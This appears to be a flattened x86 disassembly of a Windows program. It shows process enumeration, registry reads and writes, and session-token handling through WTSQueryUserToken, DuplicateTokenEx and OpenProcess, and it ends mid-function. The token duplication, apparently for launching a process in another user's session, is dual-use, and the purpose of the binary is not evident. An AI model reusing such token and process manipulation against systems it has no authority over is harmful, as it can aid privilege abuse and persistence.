call sub_401830
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x19c ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x68 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x98 ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xc8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x80 ]
call sub_401830
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
lea ecx [ ebp - 0x68 ]
call sub_410210
mov dl [ eax ]
movzx eax dl
push eax
lea ecx [ ebp - 0x80 ]
call sub_4101f0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xec ]
sub eax 0x1
cmp [ ebp - 0xe0 ] eax
jge r-xdata
mov eax [ ebp - 0xe4 ]
add eax 0x1
mov [ ebp - 0xe4 ] eax
push r--data
lea edx [ ebp - 0x80 ]
push edx
lea eax [ ebp - 0x1fc ]
push eax
call sub_416570
add esp 0xc
mov [ ebp - 0x138 ] eax
mov ecx [ ebp - 0x138 ]
mov [ ebp - 0x120 ] ecx
mov [ ebp - 0x4 ] 0xc
lea edx [ ebp - 0xb0 ]
push edx
mov eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x1cc ]
push ecx
call sub_4166e0
add esp 0xc
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x130 ]
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x4 ] 0xd
push 0x0
mov eax [ ebp - 0x128 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0xdc ]
call sub_41b6e0
mov edx [ ebp - 0xd4 ]
or edx 0x1
mov [ ebp - 0xd4 ] edx
mov [ ebp - 0x4 ] 0xc
lea ecx [ ebp - 0x1cc ]
call sub_401830
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x1fc ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x68 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x98 ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xc8 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x80 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xe0 ]
push ecx
lea ecx [ ebp - 0x68 ]
call sub_410210
movsx edx [ eax ]
cmp edx 0xffffffa1
jne r-xdata
mov edx [ ebp - 0xe0 ]
push edx
lea ecx [ ebp - 0x68 ]
call sub_410210
mov al [ eax ]
movzx ecx al
push ecx
lea ecx [ ebp - 0xb0 ]
call sub_4101f0
jmp r-xdata
mov eax [ ebp - 0xe0 ]
add eax 0x1
push eax
lea ecx [ ebp - 0x68 ]
call sub_410210
movsx ecx [ eax ]
cmp ecx 0xffffffa3
jne r-xdata
mov edx [ ebp - 0xe0 ]
add edx 0x1
mov [ ebp - 0xe0 ] edx
jmp r-xdata
sub_41e620
push ebp
mov ebp esp
push 0xffffffff
push sub_43bf48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x27c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x270 ] ecx
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov [ ebp - 0x260 ] eax
cmp [ ebp - 0x260 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x254 ] 0x22c
push 0x228
push 0x0
lea eax [ ebp - 0x250 ]
push eax
call sub_427900
add esp 0xc
push r--data
lea ecx [ ebp - 0x28 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x264 ] 0x0
lea ecx [ ebp - 0x254 ]
push ecx
mov edx [ ebp - 0x260 ]
push edx
call [ Process32FirstW@IAT ]
mov [ ebp - 0x268 ] eax
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x268 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x260 ]
push ecx
call [ CloseHandle@IAT ]
mov [ ebp - 0x25a ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov al [ ebp - 0x25a ]
push r--data
lea ecx [ ebp - 0x28 ]
call sub_40bde0
lea edx [ ebp - 0x230 ]
push edx
lea ecx [ ebp - 0x288 ]
call sub_40bd80
mov [ ebp - 0x26c ] eax
mov ecx [ ebp - 0x26c ]
call sub_401890
mov [ ebp - 0x264 ] eax
lea ecx [ ebp - 0x288 ]
call sub_40bdc0
mov [ ebp - 0x258 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x258 ]
cmp ecx [ ebp - 0x264 ]
jge r-xdata
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_41a320
movzx ecx [ eax ]
cmp ecx 0x7a
jne r-xdata
mov edx [ ebp - 0x258 ]
movzx eax [ ebp + edx * 2 - 0x230 ]
cmp eax 0x41
jl r-xdata
jmp r-xdata
push 0x2
lea ecx [ ebp - 0x28 ]
call sub_41a320
movzx edx [ eax ]
cmp edx 0x75
jne r-xdata
mov edx [ ebp - 0x258 ]
movzx eax [ ebp + edx * 2 - 0x230 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_41e940
mov ecx [ ebp - 0x258 ]
movzx edx [ ebp + ecx * 2 - 0x230 ]
cmp edx 0x5a
jg r-xdata
lea eax [ ebp - 0x254 ]
push eax
mov ecx [ ebp - 0x260 ]
push ecx
call [ Process32NextW@IAT ]
mov [ ebp - 0x268 ] eax
push 0x4
lea ecx [ ebp - 0x28 ]
call sub_41a320
movzx eax [ eax ]
cmp eax 0x6f
jne r-xdata
mov eax [ ebp - 0x258 ]
add eax 0x1
mov [ ebp - 0x258 ] eax
mov eax [ ebp - 0x258 ]
movzx ecx [ ebp + eax * 2 - 0x230 ]
add ecx 0x20
push ecx
lea ecx [ ebp - 0x28 ]
call sub_41e940
jmp r-xdata
push 0x5
lea ecx [ ebp - 0x28 ]
call sub_41a320
movzx ecx [ eax ]
cmp ecx 0x6e
jne r-xdata
jmp r-xdata
push 0x7
lea ecx [ ebp - 0x28 ]
call sub_41a320
movzx edx [ eax ]
cmp edx 0x66
jne r-xdata
push 0xb
lea ecx [ ebp - 0x28 ]
call sub_41a320
movzx eax [ eax ]
cmp eax 0x79
jne r-xdata
lea ecx [ ebp - 0x28 ]
call sub_401890
cmp eax 0x11
jne r-xdata
mov [ ebp - 0x259 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov al [ ebp - 0x259 ]
jmp r-xdata
sub_41e8a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
push eax
call sub_416860
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_41e990
xor ecx ecx
je r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
call sub_40c030
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0x8 ]
call sub_4022a0
sub_41e960
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_41b620
mov esp ebp
pop ebp
retn 0x4
sub_41e990
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c190
mov esp ebp
pop ebp
retn 0x4
sub_41e9c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_41ec40
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41e9f0
push ebp
mov ebp esp
push 0xffffffff
push sub_43c3a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_40bc30
add esp 0x4
mov esi eax
mov ecx [ ebp + 0x10 ]
call sub_401890
add esi eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_41ebf0
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_41eba0
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_41e920
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_41eab0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_41e960
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_41eaf0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x10 ]
call sub_401890
mov esi eax
mov ecx [ ebp + 0xc ]
call sub_40db00
mov edi eax
mov ecx [ ebp + 0xc ]
call sub_401890
sub edi eax
cmp esi edi
jbe r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_41e960
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_40db00
mov esi eax
mov ecx [ ebp + 0x10 ]
call sub_401890
sub esi eax
mov ecx [ ebp + 0xc ]
call sub_401890
cmp esi eax
jae r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
push edx
push 0x0
mov ecx [ ebp + 0x10 ]
call sub_41ebc0
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
sub_41ebc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0xffffffff
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_41ec70
mov esp ebp
pop ebp
retn 0x8
sub_41ebf0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x8 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
sub_41ec40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40bc30
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_41edc0
mov esp ebp
pop ebp
retn 0x4
sub_41ec70
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov ecx [ ebp + 0xc ]
call sub_401890
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
call sub_401890
sub eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
or edx 0xffffffff
sub edx [ ecx + 0x10 ]
cmp edx [ ebp + 0x14 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x14 ] eax
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
add ecx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x14 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40bd00
add esp 0xc
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_40c0d0
mov ecx [ ebp + 0x10 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bc90
add esp 0xc
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x14 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bff0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp - 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd00
add esp 0xc
jmp r-xdata
sub_41edc0
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40bbf0
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jne r-xdata
mov [ ebp - 0x14 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
sub_41ee80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
and edx 0x26
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_41efb0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_41ef10
jmp r-xdata
sub_41eee0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41f120
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
sub_41ef10
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_41ef50
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_41ef50
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41eee0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
push 0x0
mov edx [ ebp + 0x14 ]
push edx
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ RegCreateKeyExW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
xor al al
jmp r-xdata
mov esp ebp
pop ebp
retn 0x10
sub_41efb0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41eee0
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x0
xor al al
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_41f000
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call [ RegQueryValueExW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn 0x10
mov al [ ebp - 0x8 ]
sub_41f060
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call [ RegSetValueExW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn 0x10
mov al [ ebp - 0x8 ]
sub_41f0c0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
mov ax [ edx ]
mov [ ebp - 0x2 ] ax
add [ ebp - 0x8 ] 0x2
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
sar ecx 0x1
mov [ ebp - 0x10 ] ecx
push 0x1
mov edx [ ebp - 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x14 ]
call sub_41f060
mov esp ebp
pop ebp
retn 0x8
sub_41f120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor al al
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
mov al 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f160
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
push 0x0
push 0x0
call [ WTSEnumerateSessionsW@IAT ]
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp - 0xc ]
push eax
call [ WTSFreeMemory@IAT ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
imul ecx ecx 0xc
add ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ecx + 0x8 ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_41f200
push ebp
mov ebp esp
sub esp 0x2d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2d8 ] ecx
mov [ ebp - 0x2d4 ] 0x0
mov [ ebp - 0x2c0 ] 0x0
call sub_41f160
mov [ ebp - 0x2d0 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x2bc ] 0x0
mov [ ebp - 0x298 ] 0x0
mov [ ebp - 0x29c ] 0x0
lea eax [ ebp - 0x298 ]
push eax
mov ecx [ ebp - 0x2d0 ]
push ecx
call [ WTSQueryUserToken@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x298 ] 0x0
jne r-xdata
mov [ ebp - 0x2cc ] 0x0
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov [ ebp - 0x2c4 ] eax
cmp [ ebp - 0x2c4 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push 0x4
lea edx [ ebp - 0x2b4 ]
push edx
push 0x13
mov eax [ ebp - 0x298 ]
push eax
call [ GetTokenInformation@IAT ]
mov [ ebp - 0x2c0 ] eax
cmp [ ebp - 0x2c0 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x294 ] 0x22c
lea edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0x2c4 ]
push eax
call [ Process32FirstW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x2b4 ]
mov [ ebp - 0x29c ] edx
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
push 0x0
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x2c4 ]
push edx
call [ CloseHandle@IAT ]
cmp [ ebp - 0x2cc ] 0x0
jne r-xdata
push r--data
lea ecx [ ebp - 0x270 ]
push ecx
call sub_424898
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x2a0 ] 0x0
mov edx [ ebp - 0x2c8 ]
or edx 0x400
mov [ ebp - 0x2c8 ] edx
jmp r-xdata
lea eax [ ebp - 0x29c ]
push eax
push 0x1
push 0x1
push 0x0
push 0x2000000
mov ecx [ ebp - 0x298 ]
push ecx
call [ DuplicateTokenEx@IAT ]
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov edx 0xc
imul edx edx 0x0
mov eax [ ebp - 0x14 ]
mov [ ebp + edx - 0x20 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp + edx - 0x1c ] ecx
mov edx 0xc
imul edx edx 0x0
mov [ ebp + edx - 0x18 ] 0x2
mov eax [ ebp - 0x2cc ]
push eax
push 0x0
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x2bc ] eax
cmp [ ebp - 0x2bc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0x294 ]
push eax
mov ecx [ ebp - 0x2c4 ]
push ecx
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x28c ]
push eax
call [ ProcessIdToSessionId@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ ebp - 0x38 ] cx
mov eax 0x5
mov [ ebp - 0x38 ] ax
jmp r-xdata
push 0x44
push 0x0
lea eax [ ebp - 0x68 ]
push eax
call sub_427900
add esp 0xc
mov [ ebp - 0x68 ] 0x44
mov [ ebp - 0x3c ] 0x1
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
test edx edx
je r-xdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x2c8 ] 0x2000000
push 0x1
mov eax [ ebp - 0x29c ]
push eax
lea ecx [ ebp - 0x2a0 ]
push ecx
call [ CreateEnvironmentBlock@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x298 ]
push ecx
push 0xf00ff
mov edx [ ebp - 0x2bc ]
push edx
